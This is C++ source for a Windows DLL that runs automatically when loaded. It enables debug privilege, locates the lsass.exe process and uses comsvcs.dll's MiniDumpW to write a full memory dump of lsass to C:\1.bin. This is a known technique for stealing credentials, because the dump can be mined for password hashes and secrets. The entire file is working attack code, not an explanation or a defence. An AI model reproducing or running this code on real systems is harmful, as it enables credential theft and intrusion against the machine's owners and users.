#include "pch.h"
#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>


#pragma comment(lib,"Dbghelp.lib")

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);


typedef int(_stdcall *_RtlAdjustPrivilege)(int, BOOL, BOOL, ULONG *);

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

int dump() {

	HRESULT             hr;
	_MiniDumpW          MiniDumpW;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	ULONG               t;

	MiniDumpW = (_MiniDumpW)GetProcAddress(
		LoadLibrary(L"comsvcs.dll"), "MiniDumpW");

	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
		GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

	if (MiniDumpW == NULL) {

		return 0;
	}
	// try enable debug privilege
	RtlAdjustPrivilege(20, TRUE, FALSE, &t);

	wchar_t  ws[100];
	DWORD ProcessId = 0;
	ProcessId = GetProcessIdByName(L"lsass.exe");
	swprintf(ws, 100, L"%d %hs", ProcessId, "C:\\1.bin full"); //784是lsass进程的pid号  "<pid> <dump.bin> full" 
	wprintf(ws);
	MiniDumpW(0, 0, ws);
	return 0;

}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		dump();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

